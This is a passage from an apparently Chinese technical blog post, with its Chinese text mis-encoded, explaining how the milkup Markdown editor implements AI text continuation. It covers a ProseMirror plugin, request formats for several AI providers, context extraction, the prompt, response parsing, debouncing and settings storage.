            <span class="hljs-attr">suggestion</span>: <span class="hljs-literal">null</span>,
            <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span>
          };
        }

        <span class="hljs-comment">// æ‰‹åŠ¨æ›´æ–°ï¼ˆå¦‚ AI è¿”å›ç»“æœï¼‰</span>
        <span class="hljs-keyword">const</span> meta = tr.<span class="hljs-title function_">getMeta</span>(completionKey);
        <span class="hljs-keyword">if</span> (meta) {
          <span class="hljs-keyword">return</span> meta;
        }

        <span class="hljs-keyword">return</span> value;
      }
    },
    <span class="hljs-attr">props</span>: {
      <span class="hljs-title function_">decorations</span>(<span class="hljs-params">state</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getState</span>(state)?.<span class="hljs-property">decoration</span>;
      },
      <span class="hljs-title function_">handleKeyDown</span>(<span class="hljs-params">view, event</span>) {
        <span class="hljs-comment">// å¤„ç† Tab é”®æ¥å—å»ºè®®</span>
        <span class="hljs-keyword">if</span> (event.<span class="hljs-property">key</span> === <span class="hljs-string">"Tab"</span>) {
          <span class="hljs-keyword">const</span> state = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getState</span>(view.<span class="hljs-property">state</span>);
          <span class="hljs-keyword">if</span> (state?.<span class="hljs-property">suggestion</span>) {
            event.<span class="hljs-title function_">preventDefault</span>();
            <span class="hljs-keyword">const</span> tr = view.<span class="hljs-property">state</span>.<span class="hljs-property">tr</span>.<span class="hljs-title function_">insertText</span>(
              state.<span class="hljs-property">suggestion</span>,
              view.<span class="hljs-property">state</span>.<span class="hljs-property">selection</span>.<span class="hljs-property">to</span>
            );
            tr.<span class="hljs-title function_">setMeta</span>(completionKey, {
              <span class="hljs-attr">decoration</span>: <span class="hljs-title class_">DecorationSet</span>.<span class="hljs-property">empty</span>,
              <span class="hljs-attr">suggestion</span>: <span class="hljs-literal">null</span>,
              <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span>
            });
            view.<span class="hljs-title function_">dispatch</span>(tr);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
          }
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
      }
    }
  });
});
</code></pre>
<p><strong>æ’ä»¶çŠ¶æ€åŒ…å«ä¸‰ä¸ªå­—æ®µï¼š</strong></p>
<ul>
<li><code>decoration</code>ï¼šç”¨äºæ˜¾ç¤ºå»ºè®®çš„è£…é¥°å™¨é›†åˆ</li>
<li><code>suggestion</code>ï¼šå½“å‰çš„å»ºè®®æ–‡æœ¬</li>
<li><code>loading</code>ï¼šæ˜¯å¦æ­£åœ¨è¯·æ±‚ AI</li>
</ul>
<h4 data-id="heading-27">3.2.2 å¤š AI æä¾›å•†é›†æˆ</h4>
<p>AI æœåŠ¡å±‚ä½äº <code>src/renderer/services/ai.ts</code>ï¼Œé€šè¿‡ç»Ÿä¸€çš„æ¥å£æ”¯æŒå¤šä¸ªæä¾›å•†ã€‚</p>
<p><strong>æœåŠ¡æ¥å£è®¾è®¡ï¼š</strong></p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AIService</span> {
  <span class="hljs-function"><span class="hljs-type">static</span> async <span class="hljs-title">complete</span><span class="hljs-params">(context: APIContext)</span>: Promise&lt;CompletionResponse&gt; {</span>
    <span class="hljs-type">const</span> config = <span class="hljs-built_in">useAIConfig</span>().config.value;

    <span class="hljs-keyword">if</span> (!config.enabled || !config.apiKey) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">"AI æœåŠ¡æœªé…ç½®"</span>);
    }

    <span class="hljs-comment">// æ ¹æ®æä¾›å•†æ„å»ºä¸åŒçš„è¯·æ±‚</span>
    <span class="hljs-type">const</span> { url, headers, body } = <span class="hljs-keyword">this</span>.<span class="hljs-built_in">buildRequest</span>(config, context);

    <span class="hljs-comment">// å‘é€è¯·æ±‚</span>
    <span class="hljs-type">const</span> response = await <span class="hljs-keyword">this</span>.<span class="hljs-built_in">request</span>(url, {
      method: <span class="hljs-string">"POST"</span>,
      headers,
      body: JSON.<span class="hljs-built_in">stringify</span>(body)
    });

    <span class="hljs-comment">// è§£æå“åº”</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.<span class="hljs-built_in">parseResponse</span>(response, config.provider);
  }
}
</code></pre>
<p><strong>å„æä¾›å•†çš„å®ç°å·®å¼‚ï¼š</strong></p>
<ol>
<li><strong>OpenAI / è‡ªå®šä¹‰ API</strong>ï¼šä½¿ç”¨ <code>response_format</code> å¼ºåˆ¶ JSON è¾“å‡º</li>
</ol>
<pre><code class="hljs language-css" lang="css">case "openai":
case <span class="hljs-string">"custom"</span>:
  return {
    url: `${config<span class="hljs-selector-class">.baseUrl</span>}/chat/completions`,
    headers: {
      "<span class="hljs-attribute">Content</span>-Type": <span class="hljs-string">"application/json"</span>,
      <span class="hljs-string">"Authorization"</span>: `Bearer ${config<span class="hljs-selector-class">.apiKey</span>}`
    },
    <span class="hljs-selector-tag">body</span>: {
      model: config.model,
      messages: [
        { role: <span class="hljs-string">"system"</span>, content: SYSTEM_PROMPT },
        { role: <span class="hljs-string">"user"</span>, content: userMessage }
      ],
      temperature: config.temperature,
      response_format: {
        type: <span class="hljs-string">"json_schema"</span>,
        json_schema: {
          name: <span class="hljs-string">"continuation"</span>,
          schema: {
            type: <span class="hljs-string">"object"</span>,
            properties: {
              continuation: { type: <span class="hljs-string">"string"</span> }
            },
            required: [<span class="hljs-string">"continuation"</span>]
          }
        }
      }
    }
  };
</code></pre>
<ol>
<li><strong>Anthropic (Claude)</strong> ï¼šä½¿ç”¨ Tool Use æœºåˆ¶</li>
</ol>
<pre><code class="hljs language-css" lang="css">case "anthropic":
  return {
    url: `${config<span class="hljs-selector-class">.baseUrl</span>}/v1/messages`,
    headers: {
      "<span class="hljs-attribute">Content</span>-Type": <span class="hljs-string">"application/json"</span>,
      <span class="hljs-string">"x-api-key"</span>: config.apiKey,
      <span class="hljs-string">"anthropic-version"</span>: <span class="hljs-string">"2023-06-01"</span>
    },
    <span class="hljs-selector-tag">body</span>: {
      model: config.model,
      system: SYSTEM_PROMPT,
      messages: [{ role: <span class="hljs-string">"user"</span>, content: userMessage }],
      tools: [{
        name: <span class="hljs-string">"print_continuation"</span>,
        description: <span class="hljs-string">"è¾“å‡ºç»­å†™å†…å®¹"</span>,
        input_schema: {
          type: <span class="hljs-string">"object"</span>,
          properties: {
            continuation: { type: <span class="hljs-string">"string"</span> }
          },
          required: [<span class="hljs-string">"continuation"</span>]
        }
      }],
      tool_choice: { type: <span class="hljs-string">"tool"</span>, name: <span class="hljs-string">"print_continuation"</span> }
    }
  };
</code></pre>
<ol>
<li><strong>Google Gemini</strong>ï¼šä½¿ç”¨ <code>responseMimeType</code> å’Œ <code>responseSchema</code></li>
</ol>
<pre><code class="hljs language-css" lang="css">case "gemini":
  return {
    url: `${config<span class="hljs-selector-class">.baseUrl</span>}/v1beta/models/${config<span class="hljs-selector-class">.model</span>}:generateContent?key=${config<span class="hljs-selector-class">.apiKey</span>}`,
    headers: {
      "<span class="hljs-attribute">Content</span>-Type": <span class="hljs-string">"application/json"</span>
    },
    <span class="hljs-selector-tag">body</span>: {
      contents: [{
        parts: [{ text: SYSTEM_PROMPT + <span class="hljs-string">"\n"</span> + userMessage }]
      }],
      generationConfig: {
        temperature: config.temperature,
        responseMimeType: <span class="hljs-string">"application/json"</span>,
        responseSchema: {
          type: <span class="hljs-string">"OBJECT"</span>,
          properties: {
            continuation: { type: <span class="hljs-string">"STRING"</span> }
          },
          required: [<span class="hljs-string">"continuation"</span>]
        }
      }
    }
  };
</code></pre>
<ol>
<li><strong>Ollama</strong>ï¼šä½¿ç”¨ <code>format</code> å‚æ•°æŒ‡å®š JSON Schema</li>
</ol>
<pre><code class="hljs language-css" lang="css">case "ollama":
  return {
    url: `${config<span class="hljs-selector-class">.baseUrl</span>}/api/chat`,
    headers: {
      "<span class="hljs-attribute">Content</span>-Type": <span class="hljs-string">"application/json"</span>
    },
    <span class="hljs-selector-tag">body</span>: {
      model: config.model,
      messages: [
        { role: <span class="hljs-string">"system"</span>, content: SYSTEM_PROMPT },
        { role: <span class="hljs-string">"user"</span>, content: userMessage }
      ],
      format: {
        type: <span class="hljs-string">"object"</span>,
        properties: {
          continuation: { type: <span class="hljs-string">"string"</span> }
        },
        required: [<span class="hljs-string">"continuation"</span>]
      },
      stream: false,
      options: {
        temperature: config.temperature
      }
    }
  };
</code></pre>
<p><strong>è®¾è®¡äº®ç‚¹ï¼š</strong></p>
<ul>
<li>ç»Ÿä¸€çš„æ¥å£ï¼Œéšè—æä¾›å•†å·®å¼‚</li>
<li>å……åˆ†åˆ©ç”¨å„æä¾›å•†çš„åŸç”Ÿèƒ½åŠ›ï¼ˆJSON Schemaã€Tool Useï¼‰</li>
<li>æ˜“äºæ‰©å±•ï¼Œæ·»åŠ æ–°æä¾›å•†åªéœ€å¢åŠ ä¸€ä¸ª case</li>
</ul>
<h4 data-id="heading-28">3.2.3 ä¸Šä¸‹æ–‡æå–ç­–ç•¥</h4>
<p>AI ç»­å†™çš„è´¨é‡å¾ˆå¤§ç¨‹åº¦ä¸Šå–å†³äºä¸Šä¸‹æ–‡çš„è´¨é‡ã€‚milkup å®ç°äº†æ™ºèƒ½çš„ä¸Šä¸‹æ–‡æå–ç­–ç•¥ã€‚</p>
<p><strong>æå–çš„ä¿¡æ¯ï¼š</strong></p>
<ol>
<li><strong>æ–‡ä»¶æ ‡é¢˜</strong>ï¼šä»æ–‡ä»¶è·¯å¾„ä¸­æå–</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> fileTitle = (<span class="hljs-variable language_">window</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>).<span class="hljs-property">__currentFilePath</span>
  ? (<span class="hljs-variable language_">window</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>).<span class="hljs-property">__currentFilePath</span>.<span class="hljs-title function_">split</span>(<span class="hljs-regexp">/[\/]/</span>).<span class="hljs-title function_">pop</span>()
  : <span class="hljs-string">"æœªå‘½åæ–‡æ¡£"</span>;
</code></pre>
<ol>
<li><strong>å‰æ–‡å†…å®¹</strong>ï¼šè·å–å…‰æ ‡å‰æœ€è¿‘ 200 ä¸ªå­—ç¬¦</li>
</ol>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">start</span> = Math.max(<span class="hljs-number">0</span>, to - <span class="hljs-number">200</span>)<span class="hljs-comment">;</span>
const <span class="hljs-attr">previousContent</span> = doc.textBetween(start, to, <span class="hljs-string">"\n"</span>)<span class="hljs-comment">;</span>
</code></pre>
<ol>
<li><strong>æ ‡é¢˜å±‚çº§</strong>ï¼šéå†æ–‡æ¡£æå–æ‰€æœ‰æ ‡é¢˜</li>
</ol>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-keyword">const</span> headers: { level: number; <span class="hljs-keyword">text</span>: <span class="hljs-type">string</span> }[] = [];
doc.nodesBetween(<span class="hljs-number">0</span>, <span class="hljs-keyword">to</span>, (node, pos) =&gt; {
  <span class="hljs-keyword">if</span> (node.type.name === <span class="hljs-string">"heading"</span>) {
    <span class="hljs-keyword">if</span> (pos + node.nodeSize &lt;= <span class="hljs-keyword">to</span>) {
      headers.push({
        level: node.attrs.level,
        <span class="hljs-keyword">text</span>: node.textContent
      });
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  }
  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
});
</code></pre>
<ol>
<li><strong>å½“å‰ç« èŠ‚</strong>ï¼šç¡®å®šå½“å‰æ‰€åœ¨çš„ç« èŠ‚å’Œå­ç« èŠ‚</li>
</ol>
<pre><code class="hljs language-ini" lang="ini">let <span class="hljs-attr">sectionTitle</span> = <span class="hljs-string">"æœªçŸ¥"</span><span class="hljs-comment">;</span>
let <span class="hljs-attr">subSectionTitle</span> = <span class="hljs-string">"æœªçŸ¥"</span><span class="hljs-comment">;</span>

if (headers.length &gt; 0) {
  const <span class="hljs-attr">lastHeader</span> = headers[headers.length - <span class="hljs-number">1</span>]<span class="hljs-comment">;</span>
  <span class="hljs-attr">subSectionTitle</span> = lastHeader.text<span class="hljs-comment">;</span>

  // æŸ¥æ‰¾çˆ¶çº§æ ‡é¢˜
  const <span class="hljs-attr">parentHeader</span> = headers
    .slice(0, -1)
    .reverse()
    .find((h) =&gt; h.level &lt; lastHeader.level)<span class="hljs-comment">;</span>

  if (parentHeader) {
    <span class="hljs-attr">sectionTitle</span> = parentHeader.text<span class="hljs-comment">;</span>
  }
}
</code></pre>
<p><strong>æ„å»º Promptï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-title function_">buildPrompt</span>(<span class="hljs-attr">context</span>: <span class="hljs-title class_">APIContext</span>): <span class="hljs-built_in">string</span> {
  <span class="hljs-keyword">return</span> <span class="hljs-string">`ä¸Šä¸‹æ–‡ï¼š
æ–‡ç« æ ‡é¢˜ï¼š<span class="hljs-subst">${context.fileTitle || <span class="hljs-string">"æœªçŸ¥"</span>}</span>
å¤§æ ‡é¢˜ï¼š<span class="hljs-subst">${context.sectionTitle || <span class="hljs-string">"æœªçŸ¥"</span>}</span>
æœ¬å°èŠ‚æ ‡é¢˜ï¼š<span class="hljs-subst">${context.subSectionTitle || <span class="hljs-string">"æœªçŸ¥"</span>}</span>
å‰é¢å†…å®¹ï¼ˆè¯·ç´§å¯†è¡”æ¥ï¼‰ï¼š<span class="hljs-subst">${context.previousContent}</span>`</span>;
}
</code></pre>
<p><strong>System Promptï¼š</strong></p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> SYSTEM_PROMPT = `ä½ æ˜¯ä¸€ä¸ªæŠ€æœ¯æ–‡æ¡£ç»­å†™åŠ©æ‰‹ã€‚
ä¸¥æ ¼åªè¾“å‡ºä»¥ä¸‹ JSONï¼Œ**ä¸è¦æœ‰ä»»ä½•å‰ç¼€ã€åç¼€ã€markdownã€æ¢è¡Œã€è§£é‡Š**ï¼š

{<span class="hljs-string">"continuation"</span>: <span class="hljs-string">"æ¥ä¸‹æ¥åªå†™3â€“35ä¸ªæ±‰å­—çš„è‡ªç„¶è¡”æ¥å†…å®¹"</span>}
`;
</code></pre>
<p><strong>è®¾è®¡ç†å¿µï¼š</strong></p>
<ul>
<li><strong>ç»“æ„åŒ–ç†è§£</strong>ï¼šä¸ä»…æä¾›æ–‡æœ¬ï¼Œè¿˜æä¾›æ–‡æ¡£ç»“æ„</li>
<li><strong>ç²¾ç¡®å®šä½</strong>ï¼šæ˜ç¡®å½“å‰æ‰€åœ¨çš„ç« èŠ‚ä½ç½®</li>
<li><strong>é•¿åº¦æ§åˆ¶</strong>ï¼šé™åˆ¶ 3-35 ä¸ªæ±‰å­—ï¼Œé¿å…è¿‡åº¦ç”Ÿæˆ</li>
<li><strong>æ ¼å¼çº¦æŸ</strong>ï¼šå¼ºåˆ¶ JSON è¾“å‡ºï¼Œä¾¿äºè§£æ</li>
</ul>
<h4 data-id="heading-29">3.2.4 UI æ˜¾ç¤ºæœºåˆ¶</h4>
<p>å»ºè®®çš„æ˜¾ç¤ºä½¿ç”¨ ProseMirror çš„ Decoration ç³»ç»Ÿï¼Œåœ¨å…‰æ ‡ä½ç½®æ’å…¥åŠé€æ˜çš„å»ºè®®æ–‡æœ¬ã€‚</p>
<p><strong>åˆ›å»ºå»ºè®® Widgetï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">// åˆ›å»ºå»ºè®®å…ƒç´ 
const <span class="hljs-attr">widget</span> = document.createElement(<span class="hljs-string">"span"</span>)<span class="hljs-comment">;</span>
<span class="hljs-attr">widget.textContent</span> = result.continuation<span class="hljs-comment">;</span>
<span class="hljs-attr">widget.className</span> = <span class="hljs-string">"ai-completion-suggestion"</span><span class="hljs-comment">;</span>
<span class="hljs-attr">widget.style.color</span> = <span class="hljs-string">"var(--text-color-light, #999)"</span><span class="hljs-comment">;</span>
<span class="hljs-attr">widget.style.opacity</span> = <span class="hljs-string">"0.6"</span><span class="hljs-comment">;</span>
<span class="hljs-attr">widget.style.fontStyle</span> = <span class="hljs-string">"italic"</span><span class="hljs-comment">;</span>
<span class="hljs-attr">widget.style.pointerEvents</span> = <span class="hljs-string">"none"</span><span class="hljs-comment">;  // ä¸å½±å“é¼ æ ‡äº¤äº’</span>
<span class="hljs-attr">widget.style.userSelect</span> = <span class="hljs-string">"none"</span><span class="hljs-comment">;     // ä¸å¯é€‰ä¸­</span>
<span class="hljs-attr">widget.dataset.suggestion</span> = result.continuation<span class="hljs-comment">;</span>

// åˆ›å»ºè£…é¥°å™¨
const <span class="hljs-attr">deco</span> = Decoration.widget(to, widget, { side: <span class="hljs-number">1</span> })<span class="hljs-comment">;</span>
const <span class="hljs-attr">decoSet</span> = DecorationSet.create(view.state.doc, [deco])<span class="hljs-comment">;</span>

// æ›´æ–°ç¼–è¾‘å™¨çŠ¶æ€
const <span class="hljs-attr">tr</span> = view.state.tr.setMeta(completionKey, {
  decoration: decoSet,
  suggestion: result.continuation,
  loading: false
})<span class="hljs-comment">;</span>
view.dispatch(tr)<span class="hljs-comment">;</span>
</code></pre>
<p><strong>æ ·å¼è®¾è®¡ï¼š</strong></p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.ai-completion-suggestion</span> {
  <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--text-color-<span class="hljs-number">3</span>);
  <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.5</span>;
  <span class="hljs-attribute">font-style</span>: italic;
  <span class="hljs-attribute">pointer-events</span>: none;
  user-select: none;
  <span class="hljs-attribute">transition</span>: opacity <span class="hljs-number">0.2s</span> ease;

  &amp;<span class="hljs-selector-pseudo">:hover</span> {
    <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.7</span>;
  }
}
</code></pre>
<p><strong>äº¤äº’è®¾è®¡ï¼š</strong></p>
<ol>
<li><strong>Tab é”®æ¥å—å»ºè®®</strong>ï¼š</li>
</ol>
<pre><code class="hljs language-ini" lang="ini">if (<span class="hljs-attr">event.key</span> === <span class="hljs-string">"Tab"</span>) {
  const <span class="hljs-attr">state</span> = this.getState(view.state)<span class="hljs-comment">;</span>
  if (state?.suggestion) {
    event.preventDefault()<span class="hljs-comment">;</span>

    // æ’å…¥å»ºè®®æ–‡æœ¬
    const <span class="hljs-attr">tr</span> = view.state.tr.insertText(
      state.suggestion,
      view.state.selection.to
    )<span class="hljs-comment">;</span>

    // æ¸…é™¤å»ºè®®
    tr.setMeta(completionKey, {
      decoration: DecorationSet.empty,
      suggestion: null,
      loading: false
    })<span class="hljs-comment">;</span>

    view.dispatch(tr)<span class="hljs-comment">;</span>
    return true<span class="hljs-comment">;</span>
  }
}
</code></pre>
<ol>
<li><strong>è‡ªåŠ¨æ¸…é™¤æœºåˆ¶</strong>ï¼š</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">apply</span>(<span class="hljs-params">tr, value</span>) {
  <span class="hljs-comment">// æ–‡æ¡£å†…å®¹å˜åŒ–æ—¶æ¸…é™¤å»ºè®®</span>
  <span class="hljs-keyword">if</span> (tr.<span class="hljs-property">docChanged</span>) {
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">decoration</span>: <span class="hljs-title class_">DecorationSet</span>.<span class="hljs-property">empty</span>,
      <span class="hljs-attr">suggestion</span>: <span class="hljs-literal">null</span>,
      <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span>
    };
  }

  <span class="hljs-keyword">return</span> value;
}
</code></pre>
<p><strong>ç”¨æˆ·ä½“éªŒç»†èŠ‚ï¼š</strong></p>
<ul>
<li><strong>åŠé€æ˜æ˜¾ç¤º</strong>ï¼šä¸å¹²æ‰°æ­£å¸¸é˜…è¯»</li>
<li><strong>æ–œä½“æ ·å¼</strong>ï¼šä¸æ­£æ–‡åŒºåˆ†</li>
<li><strong>ä¸å¯äº¤äº’</strong>ï¼šä¸å½±å“é¼ æ ‡ç‚¹å‡»å’Œæ–‡æœ¬é€‰æ‹©</li>
<li><strong>å³æ—¶æ¸…é™¤</strong>ï¼šç”¨æˆ·ç»§ç»­è¾“å…¥æ—¶è‡ªåŠ¨æ¶ˆå¤±</li>
<li><strong>å¿«æ·æ¥å—</strong>ï¼šTab é”®ä¸€é”®æ¥å—</li>
</ul>
<h3 data-id="heading-30">3.3 æŠ€æœ¯æŒ‘æˆ˜ä¸è§£å†³æ–¹æ¡ˆ</h3>
<h4 data-id="heading-31">3.3.1 ç»“æ„åŒ–è¾“å‡ºçš„æŒ‘æˆ˜</h4>
<p><strong>é—®é¢˜</strong>ï¼šä¸åŒçš„ AI æ¨¡å‹å¯¹è¾“å‡ºæ ¼å¼çš„æ§åˆ¶èƒ½åŠ›ä¸åŒï¼Œæœ‰äº›æ¨¡å‹å¯èƒ½è¾“å‡ºé¢å¤–çš„æ–‡æœ¬ã€markdown ä»£ç å—æˆ–è§£é‡Šæ€§å†…å®¹ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<ol>
<li>
<p><strong>åˆ©ç”¨å„æä¾›å•†çš„åŸç”Ÿèƒ½åŠ›</strong>ï¼š</p>
<ul>
<li>OpenAIï¼šä½¿ç”¨ <code>response_format</code> çš„ JSON Schema</li>
<li>Claudeï¼šä½¿ç”¨ Tool Use æœºåˆ¶</li>
<li>Geminiï¼šä½¿ç”¨ <code>responseMimeType</code> å’Œ <code>responseSchema</code></li>
<li>Ollamaï¼šä½¿ç”¨ <code>format</code> å‚æ•°</li>
</ul>
</li>
<li>
<p><strong>å¤šå±‚è§£æç­–ç•¥</strong>ï¼š</p>
</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-title function_">parseResponse</span>(<span class="hljs-attr">text</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">CompletionResponse</span> {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// 1. å°è¯•ç›´æ¥ JSON è§£æ</span>
    <span class="hljs-keyword">const</span> cleanText = text.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/```json\n?|\n?```/g</span>, <span class="hljs-string">""</span>).<span class="hljs-title function_">trim</span>();
    <span class="hljs-keyword">const</span> json = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(cleanText);
    <span class="hljs-keyword">if</span> (json.<span class="hljs-property">continuation</span>) {
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">continuation</span>: json.<span class="hljs-property">continuation</span> };
    }
  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">"JSON parse failed, trying regex extraction"</span>);
  }

  <span class="hljs-comment">// 2. æ­£åˆ™æå–</span>
  <span class="hljs-keyword">const</span> match = text.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/"continuation"\s*:\s*"([^"]+)"/</span>);
  <span class="hljs-keyword">if</span> (match &amp;&amp; match[<span class="hljs-number">1</span>]) {
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">continuation</span>: match[<span class="hljs-number">1</span>] };
  }

  <span class="hljs-comment">// 3. å…œåº•ç­–ç•¥ï¼šå¦‚æœæ–‡æœ¬å¾ˆçŸ­ä¸”ä¸åŒ…å« JSON ç»“æ„ï¼Œç›´æ¥ä½¿ç”¨</span>
  <span class="hljs-keyword">if</span> (text.<span class="hljs-property">length</span> &lt; <span class="hljs-number">50</span> &amp;&amp; !text.<span class="hljs-title function_">includes</span>(<span class="hljs-string">"{"</span>)) {
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">continuation</span>: text.<span class="hljs-title function_">trim</span>() };
  }

  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"Failed to parse AI response"</span>);
}
</code></pre>
<p><strong>é²æ£’æ€§ä¿è¯ï¼š</strong></p>
<ul>
<li>æ¸…ç† markdown ä»£ç å—æ ‡è®°</li>
<li>æ­£åˆ™è¡¨è¾¾å¼å…œåº•</li>
<li>çŸ­æ–‡æœ¬ç›´æ¥ä½¿ç”¨</li>
<li>å¤šå±‚å®¹é”™æœºåˆ¶</li>
</ul>
<h4 data-id="heading-32">3.3.2 é˜²æŠ–ä¸å–æ¶ˆæœºåˆ¶</h4>
<p><strong>é—®é¢˜</strong>ï¼šç”¨æˆ·è¾“å…¥æ—¶é¢‘ç¹è§¦å‘ AI è¯·æ±‚ï¼Œæµªè´¹èµ„æºä¸”å½±å“ä½“éªŒã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<ol>
<li><strong>é˜²æŠ–è§¦å‘</strong>ï¼š</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">let</span> <span class="hljs-attr">debounceTimer</span>: <span class="hljs-title class_">NodeJS</span>.<span class="hljs-property">Timeout</span> | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;

view.<span class="hljs-title function_">updateState</span>(view.<span class="hljs-property">state</span>);

<span class="hljs-comment">// æ¸…é™¤æ—§çš„å®šæ—¶å™¨</span>
<span class="hljs-keyword">if</span> (debounceTimer) {
  <span class="hljs-built_in">clearTimeout</span>(debounceTimer);
}

<span class="hljs-comment">// è®¾ç½®æ–°çš„å®šæ—¶å™¨</span>
debounceTimer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">async</span> () =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title class_">AIService</span>.<span class="hljs-title function_">complete</span>(context);

    <span class="hljs-comment">// æ˜¾ç¤ºå»ºè®®</span>
    <span class="hljs-comment">// ...</span>
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"AI completion failed:"</span>, error);
  }
}, config.<span class="hljs-property">debounceWait</span> || <span class="hljs-number">1500</span>);
</code></pre>
<ol>
<li><strong>è¯·æ±‚å–æ¶ˆ</strong>ï¼š</li>
</ol>
<pre><code class="hljs language-ini" lang="ini">let currentAbortController: AbortController | <span class="hljs-attr">null</span> = null<span class="hljs-comment">;</span>

// å–æ¶ˆæ—§è¯·æ±‚
if (currentAbortController) {
  currentAbortController.abort()<span class="hljs-comment">;</span>
}

// åˆ›å»ºæ–°çš„ AbortController
<span class="hljs-attr">currentAbortController</span> = new AbortController()<span class="hljs-comment">;</span>

const <span class="hljs-attr">response</span> = await fetch(url, {
  signal: currentAbortController.signal,
  // ...
})<span class="hljs-comment">;</span>
</code></pre>
<p><strong>ä¼˜åŒ–æ•ˆæœï¼š</strong></p>
<ul>
<li>å‡å°‘ä¸å¿…è¦çš„ API è°ƒç”¨</li>
<li>èŠ‚çœæˆæœ¬</li>
<li>æå‡å“åº”é€Ÿåº¦</li>
<li>é¿å…è¿‡æ—¶çš„å»ºè®®</li>
</ul>
<h4 data-id="heading-33">3.3.3 é…ç½®ç®¡ç†ä¸æŒä¹…åŒ–</h4>
<p><strong>é—®é¢˜</strong>ï¼šç”¨æˆ·é…ç½®éœ€è¦åœ¨åº”ç”¨é‡å¯åä¿æŒï¼Œä¸”éœ€è¦å“åº”å¼æ›´æ–°ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šä½¿ç”¨ VueUse çš„ <code>useStorage</code></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useStorage } <span class="hljs-keyword">from</span> <span class="hljs-string">"@vueuse/core"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useAIConfig</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> config = useStorage&lt;<span class="hljs-title class_">AIConfig</span>&gt;(
    <span class="hljs-string">"milkup-ai-config"</span>,
    defaultAIConfig,
    <span class="hljs-variable language_">localStorage</span>,
    { <span class="hljs-attr">mergeDefaults</span>: <span class="hljs-literal">true</span> }
  );

  <span class="hljs-keyword">return</span> { config };
}
</code></pre>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>è‡ªåŠ¨åŒæ­¥åˆ° localStorage</li>
<li>å“åº”å¼æ›´æ–°ï¼Œé…ç½®å˜åŒ–ç«‹å³ç”Ÿæ•ˆ</li>
<li>æ”¯æŒé»˜è®¤å€¼åˆå¹¶</li>
<li>ç±»å‹å®‰å…¨</li>
</ul>
<h4 data-id="heading-34">3.3.4 Ollama æ¨¡å‹åˆ—è¡¨åŠ¨æ€è·å–</h4>
<p><strong>é—®é¢˜</strong>ï¼šOllama æ”¯æŒå¤šç§æœ¬åœ°æ¨¡å‹ï¼Œéœ€è¦åŠ¨æ€è·å–å¯ç”¨æ¨¡å‹åˆ—è¡¨ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchOllamaModels</span>(<span class="hljs-params"/>) {
  loadingModels.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>;
  <span class="hljs-keyword">try</span> {
